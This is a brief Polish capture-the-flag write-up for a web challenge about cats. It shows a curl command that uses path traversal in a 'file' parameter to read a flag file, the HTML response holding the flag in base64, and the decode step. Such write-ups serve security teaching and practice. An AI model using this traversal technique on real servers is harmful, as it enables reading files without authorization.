# Trawersujące koty web Punkty: 50
# Łukasz Dzwoniarek

# pwn{koty.czy.nie,zadanie.zrobione}

```bash
$ curl https://cats.pwning2016.p4.team/view.html?file=/../../../../home/cats/flag.txt

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>A cat!</title>
</head>
<body>

    <center>
        <img alt = "Embedded Image" src = "data:image/png;base64,cHdue2tvdHkuY3p5Lm5pZSx6YWRhbmllLnpyb2Jpb25lfQo=" />
    </center>
</body>
$ echo cHdue2tvdHkuY3p5Lm5pZSx6YWRhbmllLnpyb2Jpb25lfQo= | base64 --decode
pwn{koty.czy.nie,zadanie.zrobione}
```